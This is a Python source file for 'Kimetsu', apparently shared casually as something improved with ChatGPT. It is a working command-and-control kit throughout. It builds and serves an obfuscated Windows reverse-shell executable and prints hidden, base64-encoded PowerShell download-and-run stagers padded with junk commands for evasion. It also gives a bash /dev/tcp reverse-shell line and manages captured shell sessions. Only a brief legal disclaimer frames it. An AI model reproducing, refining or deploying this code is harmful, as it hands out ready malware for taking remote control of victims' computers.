#random code i know what it dose its not mind i have put it thought Chatgpt to learn about it and then got it to impove the original code i gave it haha anyways just a bit of fun


import os
import sys
import random
import subprocess
import threading
import socket
import socketserver
import http.server
import uuid
import base64
import select
import functools
import textwrap
import time
import json
import getpass
import base64 as b64

CONFIG_FILE = "kimetsu_config.json"
VERBOSE = False

def debug_print(*args):
    if VERBOSE:
        print("[DEBUG]", *args)

# === Session Management ===

class SessionManager:
    def __init__(self, session_timeout=15 * 60):
        self.sessions = {}
        self.lock = threading.Lock()
        self.next_sid = 1
        self.session_timeout = session_timeout  # seconds

    def add_session(self, client_sock, addr):
        with self.lock:
            sid = self.next_sid
            log_filename = f"session_{sid}_{addr[0]}_{addr[1]}.log"
            log_file = open(log_filename, "ab")
            self.sessions[sid] = {
                "sock": client_sock,
                "addr": addr,
                "last_active": time.time(),
                "name": None,
                "notes": "",
                "log_file": log_file,
            }
            self.next_sid += 1
            return sid

    def update_activity(self, sid):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid]["last_active"] = time.time()

    def rename_session(self, sid, name):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid]["name"] = name

    def add_notes(self, sid, notes):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid]["notes"] += notes + "\n"

    def remove_session(self, sid):
        with self.lock:
            if sid in self.sessions:
                session = self.sessions[sid]
                sock = session["sock"]
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                sock.close()
                log_file = session.get("log_file")
                if log_file and not log_file.closed:
                    log_file.close()
                del self.sessions[sid]

    def list_sessions(self):
        with self.lock:
            return {
                sid: {
                    "addr": sess["addr"],
                    "name": sess["name"],
                    "notes": sess["notes"],
                }
                for sid, sess in self.sessions.items()
            }

    def get_session(self, sid):
        with self.lock:
            return self.sessions.get(sid, None)

    def check_timeouts(self):
        now = time.time()
        to_remove = []
        with self.lock:
            for sid, sess in self.sessions.items():
                if now - sess["last_active"] > self.session_timeout:
                    to_remove.append(sid)
        for sid in to_remove:
            print(f"[!] Session {sid} timed out due to inactivity.")
            self.remove_session(sid)

session_manager = SessionManager()

# Background thread to check session timeouts
class TimeoutChecker(threading.Thread):
    def __init__(self, interval=60):
        super().__init__(daemon=True)
        self.interval = interval
        self.running = True

    def run(self):
        while self.running:
            time.sleep(self.interval)
            session_manager.check_timeouts()

    def stop(self):
        self.running = False

timeout_checker = TimeoutChecker()
timeout_checker.start()

# === HTTP Handler with Basic Auth and POST payload delivery ===

class AuthHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    USERNAME = "admin"
    PASSWORD = "password"  # CHANGE THIS or make configurable

    def do_AUTHHEAD(self):
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Kimetsu"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def authenticate(self):
        auth_header = self.headers.get('Authorization')
        if auth_header is None:
            self.do_AUTHHEAD()
            self.wfile.write(b'No auth header received')
            return False
        auth_type, encoded = auth_header.split(' ', 1)
        if auth_type.lower() != 'basic':
            self.do_AUTHHEAD()
            self.wfile.write(b'Unsupported auth type')
            return False
        decoded = b64.b64decode(encoded.strip()).decode('utf-8')
        username, password = decoded.split(':', 1)
        if username == self.USERNAME and password == self.PASSWORD:
            return True
        else:
            self.do_AUTHHEAD()
            self.wfile.write(b'Invalid credentials')
            return False

    def do_GET(self):
        if not self.authenticate():
            return
        super().do_GET()

    def do_POST(self):
        if not self.authenticate():
            return
        exe_path = os.path.join(self.directory, "probe.exe")
        if not os.path.exists(exe_path):
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
            return
        try:
            with open(exe_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())

    def log_message(self, fmt, *args):
        if VERBOSE:
            super().log_message(fmt, *args)

# Reusable TCP server with address reuse
class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

# HTTP server thread
class HTTPServerThread(threading.Thread):
    def __init__(self, directory, port, use_auth=True):
        super().__init__(daemon=True)
        self.directory = directory
        self.requested_port = port
        self.use_auth = use_auth

        if use_auth:
            handler = functools.partial(AuthHTTPRequestHandler, directory=directory)
        else:
            handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=directory)

        p = port
        while True:
            try:
                self.server = ReusableTCPServer(("0.0.0.0", p), handler)
                break
            except OSError:
                p += 1
        self.bound_port = p

    def run(self):
        print(f"[*] HTTP server running at 0.0.0.0:{self.bound_port} serving '{self.directory}' (Auth: {self.use_auth})")
        self.server.serve_forever()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

# Shell listener thread
class ShellListener(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        p = port
        while True:
            try:
                self.sock.bind(("0.0.0.0", p))
                break
            except OSError:
                p += 1
        self.bound_port = p
        self.sock.listen(5)
        self.running = True

    def run(self):
        print(f"[*] Listening for shell connections on 0.0.0.0:{self.bound_port} ...")
        while self.running:
            try:
                client, addr = self.sock.accept()
            except OSError:
                break
            sid = session_manager.add_session(client, addr)
            print(f"[+] New session {sid} from {addr[0]}:{addr[1]}")

    def stop(self):
        self.running = False
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        self.sock.close()

# Build C reverse shell probe (Windows)
def build_probe(host, port, outdir):
    key = random.randint(1, 255)
    obf_host = ''.join(f"\\x{ord(c) ^ key:02x}" for c in host)

    c_code = textwrap.dedent(f"""
    #include <winsock2.h>
    #include <windows.h>
    #include <time.h>
    #pragma comment(lib, "ws2_32.lib")

    unsigned char key = {key};
    char host_enc[] = "{obf_host}";
    unsigned short port_val = {port};

    void xor_decode(char *s, int len) {{
        for(int i=0;i<len;i++) s[i] ^= key;
    }}

    int main() {{
        WSADATA wsa;
        SOCKET sck;
        struct sockaddr_in addr;
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        int hlen = sizeof(host_enc) - 1;
        xor_decode(host_enc, hlen);

        if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;
        sck = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port_val);
        addr.sin_addr.s_addr = inet_addr(host_enc);
        if (WSAConnect(sck, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0) return 1;

        ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sck;
        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        return 0;
    }}
    """).strip()

    os.makedirs(outdir, exist_ok=True)
    c_file = os.path.join(outdir, "probe.c")
    exe_file = os.path.join(outdir, "probe.exe")

    with open(c_file, "w") as f:
        f.write(c_code)

    print(f"[+] Compiling: x86_64-w64-mingw32-gcc -O2 {c_file} -o {exe_file} -lws2_32")
    try:
        subprocess.check_call(["x86_64-w64-mingw32-gcc", "-O2", c_file, "-o", exe_file, "-lws2_32"])
    except subprocess.CalledProcessError as e:
        print(f"[!] Compilation failed: {e}")
        sys.exit(1)

    return exe_file

# Unix reverse shell payload (bash)
def build_unix_shell(host, port):
    return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

# Interact with shell session (with logging and activity update)
def interact(sid):
    session = session_manager.get_session(sid)
    if not session:
        print(f"[!] No session with id {sid}")
        return
    sock = session["sock"]
    addr = session["addr"]
    log_file = session["log_file"]
    print(f"[*] Attached to session {sid} ({addr[0]}:{addr[1]})")

    sock.setblocking(False)
    try:
        while True:
            r, _, _ = select.select([sock, sys.stdin], [], [])
            for fd in r:
                if fd is sock:
                    try:
                        data = sock.recv(4096)
                    except ConnectionResetError:
                        print("\n[-] Connection reset by peer")
                        sock.setblocking(True)
                        return
                    if not data:
                        print("\n[-] Remote closed connection")
                        sock.setblocking(True)
                        return
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
                    if log_file and not log_file.closed:
                        log_file.write(data)
                        log_file.flush()
                    session_manager.update_activity(sid)
                else:
                    line = sys.stdin.readline()
                    if line.strip().lower() == 'detach':
                        print("[*] Detached from session")
                        sock.setblocking(True)
                        return
                    try:
                        sock.sendall(line.encode())
                        if log_file and not log_file.closed:
                            log_file.write(line.encode())
                            log_file.flush()
                        session_manager.update_activity(sid)
                    except BrokenPipeError:
                        print("\n[-] Broken pipe, connection lost")
                        sock.setblocking(True)
                        return
    except KeyboardInterrupt:
        print("\n[*] Detached (Keyboard Interrupt)")
    finally:
        sock.setblocking(True)

# Session control loop shared between tcp/http payloads
def sessions_control_loop(listener, http_thread):
    print("[*] Ready. Commands: sessions | interact <id> | kill <id> | rename <id> <name> | notes <id> <text> | verbose | back\n")
    global VERBOSE
    while True:
        try:
            cmd = input('sessions> ').strip().split(maxsplit=2)
        except EOFError:
            print("\n[*] EOF received, exiting session control.")
            listener.stop()
            http_thread.stop()
            break
        if not cmd:
            continue
        action = cmd[0].lower()
        if action in ('list', 'sessions'):
            sessions = session_manager.list_sessions()
            if not sessions:
                print(" [!] No active sessions")
            else:
                for sid, info in sessions.items():
                    name = f" ({info['name']})" if info["name"] else ""
                    print(f" {sid}: {info['addr'][0]}:{info['addr'][1]}{name}")
        elif action in ('interact', 'attach') and len(cmd) > 1 and cmd[1].isdigit():
            interact(int(cmd[1]))
        elif action == 'kill' and len(cmd) > 1 and cmd[1].isdigit():
            sid = int(cmd[1])
            session_manager.remove_session(sid)
            print(f"[+] Session {sid} terminated.")
        elif action == 'rename' and len(cmd) == 3 and cmd[1].isdigit():
            sid = int(cmd[1])
            name = cmd[2]
            session_manager.rename_session(sid, name)
            print(f"[+] Session {sid} renamed to '{name}'.")
        elif action == 'notes' and len(cmd) == 3 and cmd[1].isdigit():
            sid = int(cmd[1])
            notes = cmd[2]
            session_manager.add_notes(sid, notes)
            print(f"[+] Notes added to session {sid}.")
        elif action == 'verbose':
            VERBOSE = not VERBOSE
            print(f"Verbose mode {'enabled' if VERBOSE else 'disabled'}")
        elif action == 'back':
            listener.stop()
            http_thread.stop()
            break
        else:
            print("Commands: sessions | interact <id> | kill <id> | rename <id> <name> | notes <id> <text> | verbose | back")

# Payload generation for TCP
def generate_tcp(host, port, outdir, obf, http_auth):
    probe = build_probe(host, port, outdir)
    http_thread = HTTPServerThread(outdir, random.randint(8000, 9000), use_auth=http_auth)
    http_thread.start()
    listener = ShellListener(port)
    listener.start()

    guid = f"{uuid.uuid4().hex}.exe"
    real_cmds = [
        f"$u='http://{host}:{http_thread.bound_port}/{os.path.basename(probe)}'",
        f"$f=Join-Path $env:TEMP '{guid}'",
        "(New-Object Net.WebClient).DownloadFile($u,$f)",
        "Start-Process $f -WindowStyle Hidden"
    ]
    junk_cmds = [
        "Get-Location | Out-Null",
        "if($false){Write-Output 'junk'}",
        "Start-Sleep -Milliseconds " + str(random.randint(1, 999)),
        "[int]$x = " + str(random.randint(0, 1000))
    ]
    inserts = sorted(random.sample(range(1, len(real_cmds)), 2))
    all_cmds = []
    junk_iter = iter(random.sample(junk_cmds, 2))
    for idx, cmd in enumerate(real_cmds):
        all_cmds.append(cmd)
        if (idx + 1) in inserts:
            all_cmds.append(next(junk_iter))

    sep = random.choice([";", " ; ", "`; "])
    stub = sep.join(all_cmds)

    if obf == 'encoded':
        enc = base64.b64encode(stub.encode('utf-16le')).decode()
        print(f"\npowershell.exe -NoP -W Hidden -Enc {enc}\n")
    else:
        print(f"\npowershell.exe -NoP -W Hidden -c \"{stub}\"\n")

    sessions_control_loop(listener, http_thread)

# Payload generation for HTTP
def generate_http(host, port, outdir, obf, http_auth):
    probe = build_probe(host, port, outdir)
    http_thread = HTTPServerThread(outdir, random.randint(8000, 9000), use_auth=http_auth)
    http_thread.start()
    listener = ShellListener(port)
    listener.start()

    real_cmds = [
        f"$u='http://{host}:{http_thread.bound_port}/{os.path.basename(probe)}'",
        f"$f=Join-Path $env:TEMP '{uuid.uuid4().hex}.exe'",
        "(New-Object Net.WebClient).DownloadFile($u,$f)",
        "Start-Process $f -WindowStyle Hidden"
    ]
    junk_cmds = [
        "Get-Location | Out-Null",
        "if($false){Write-Output 'junk'}",
        "Start-Sleep -Milliseconds " + str(random.randint(1, 999)),
        "[int]$y = " + str(random.randint(0, 1000))
    ]
    inserts = sorted(random.sample(range(1, len(real_cmds)), 2))
    all_cmds = []
    junk_iter = iter(random.sample(junk_cmds, 2))
    for idx, cmd in enumerate(real_cmds):
        all_cmds.append(cmd)
        if (idx + 1) in inserts:
            all_cmds.append(next(junk_iter))

    sep = random.choice([";", " ; ", "`; "])
    stub = sep.join(all_cmds)

    if obf == 'encoded':
        enc = base64.b64encode(stub.encode('utf-16le')).decode()
        print(f"\npowershell.exe -NoP -W Hidden -Enc {enc}\n")
    else:
        print(f"\npowershell.exe -NoP -W Hidden -c \"{stub}\"\n")

    sessions_control_loop(listener, http_thread)

# Generate unix reverse shell payload
def generate_unix(host, port):
    shell_cmd = build_unix_shell(host, port)
    print("\n[*] Use this command on your target machine:\n")
    print(shell_cmd + "\n")

# Save/load config
def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE) as f:
        return json.load(f)

# --- Setup wizard with auto IP detection ---

def get_local_ip():
    """
    Attempts to detect the primary IP address of the current machine.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # This IP is arbitrary and doesn't have to be reachable; it's used to select interface
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def check_gcc_compiler():
    print("[*] Checking for MinGW-w64 gcc cross-compiler for Windows payloads...")
    try:
        result = subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print("[+] MinGW-w64 gcc found.")
            return True
        else:
            print("[!] MinGW-w64 gcc not found or not working.")
            return False
    except FileNotFoundError:
        print("[!] MinGW-w64 gcc compiler not found in PATH.")
        return False

def print_legal_disclaimer():
    print(textwrap.dedent("""
    ================== LEGAL DISCLAIMER ==================

    This tool is intended for educational, ethical, and authorized testing purposes only.
    Unauthorized use of reverse shells, payload delivery, or hacking techniques may be illegal.
    Always obtain explicit permission before testing any systems.
    The authors are not responsible for misuse of this tool.

    =======================================================
    """))

def interactive_setup():
    print_legal_disclaimer()

    has_compiler = check_gcc_compiler()
    if not has_compiler:
        print("\n[!] WARNING: Without MinGW-w64 gcc, Windows payload compilation will fail.")
        print("    Please install it and ensure 'x86_64-w64-mingw32-gcc' is in your PATH before proceeding.\n")

    print("Welcome to Kimetsu Interactive Generator setup.\n")
    print("You will be guided through setting up your payload generation and listener environment.\n")

    config = {}

    # Auto-detect IP and ask user to confirm or change it
    detected_ip = get_local_ip()
    while True:
        print(f"Detected your local IP as: {detected_ip}")
        host = input(f"Enter Callback Host/IP [{detected_ip}]: ").strip()
        if not host:
            host = detected_ip
        if host:
            config['host'] = host
            print(f" -> You set Callback Host/IP to: {host}\n")
            break
        else:
            print("[!] Host/IP cannot be empty.\n")

    # Callback Port
    while True:
        port_str = input("Enter the Callback Port (1-65535): ").strip()
        if port_str.isdigit():
            port = int(port_str)
            if 1 <= port <= 65535:
                config['port'] = port
                print(f" -> You entered: {port}\n")
                break
            else:
                print("[!] Port must be between 1 and 65535.\n")
        else:
            print("[!] Invalid port number.\n")

    # Output directory
    outdir = input("Enter output directory for payload files [default: 'out']: ").strip() or "out"
    config['outdir'] = outdir
    print(f" -> Output directory set to '{outdir}'\n")

    # Payload Mode
    valid_modes = ['tcp', 'http', 'unix']
    while True:
        mode = input("Select payload mode (tcp/http/unix) [tcp]: ").strip().lower() or "tcp"
        if mode in valid_modes:
            config['mode'] = mode
            print(f" -> Payload mode set to '{mode}'\n")
            break
        else:
            print(f"[!] Invalid mode, choose from {valid_modes}\n")

    # Obfuscation
    valid_obfs = ['none', 'encoded']
    while True:
        obf = input("Choose obfuscation (none/encoded) [none]: ").strip().lower() or "none"
        if obf in valid_obfs:
            config['obfuscation'] = obf
            print(f" -> Obfuscation set to '{obf}'\n")
            break
        else:
            print(f"[!] Invalid obfuscation, choose 'none' or 'encoded'\n")

    # HTTP Auth only for tcp/http
    http_auth = False
    if mode in ('tcp', 'http'):
        auth_choice = input("Enable HTTP Basic Auth on the HTTP server? (y/N): ").strip().lower()
        http_auth = auth_choice == 'y'
        config['http_auth'] = http_auth
        print(f" -> HTTP Basic Auth {'enabled' if http_auth else 'disabled'}\n")

        if http_auth:
            print("IMPORTANT: Default username/password is 'admin'/'password' inside the code.\n")
            print("Change these in the source code for security!\n")

    # Save config prompt
    save_choice = input("Save these settings as defaults? (y/N): ").strip().lower()
    if save_choice == "y":
        save_config(config)
        print(f"[+] Settings saved to {CONFIG_FILE}\n")

    print("Setup complete! Now generating payload and starting listener...\n")

    return config

# Main interactive loop
def main():
    global VERBOSE
    config = load_config()

    print("Kimetsu Interactive Generator")
    print("Type 'help' for commands.\n")

    while True:
        cmd = input("Kimetsu> ").strip().lower()
        if cmd in ("generate", "g"):
            if config:
                print("[*] Using saved configuration. Press Enter to accept defaults or type new value.\n")
            else:
                print("[*] No saved configuration found. Starting setup wizard.\n")
                config.update(interactive_setup())

            # Prompt user for overrides or accept saved config
            mode = input(f" Mode (tcp/http/unix) [{config.get('mode', 'tcp')}]: ").strip().lower() or config.get('mode', 'tcp')
            host = input(f" Callback Host/IP [{config.get('host', '')}]: ").strip() or config.get('host', '')
            port_input = input(f" Callback Port [{config.get('port', '')}]: ").strip() or str(config.get('port', ''))
            outdir = input(f" OutDir [{config.get('outdir', 'out')}]: ").strip() or config.get('outdir', 'out')
            obf = input(f" Obfuscation (none/encoded) [{config.get('obfuscation', 'none')}]: ").strip().lower() or config.get('obfuscation', 'none')
            http_auth = config.get('http_auth', False)

            # Validate inputs minimally
            if not host:
                print("[!] Callback Host/IP is required.")
                continue
            if not port_input.isdigit() or not (1 <= int(port_input) <= 65535):
                print("[!] Invalid port number.")
                continue
            port = int(port_input)
            if mode not in ('tcp', 'http', 'unix'):
                print("[!] Invalid mode, defaulting to tcp.")
                mode = 'tcp'
            if obf not in ('none', 'encoded'):
                print("[!] Invalid obfuscation, defaulting to none.")
                obf = 'none'

            if mode == 'unix':
                generate_unix(host, port)
            elif mode == 'tcp':
                generate_tcp(host, port, outdir, obf, http_auth)
            elif mode == 'http':
                generate_http(host, port, outdir, obf, http_auth)

        elif cmd in ("help", "?"):
            print(" generate | g        Build & serve payload")
            print(" verbose              Toggle verbose debug logging")
            print(" exit | quit         Quit program\n")

        elif cmd == "verbose":
            VERBOSE = not VERBOSE
            print(f"Verbose mode {'enabled' if VERBOSE else 'disabled'}")

        elif cmd in ("exit", "quit"):
            print("Goodbye!")
            timeout_checker.stop()
            break

        else:
            print("Unknown command. Type 'help'.\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        timeout_checker.stop()
        sys.exit(0)
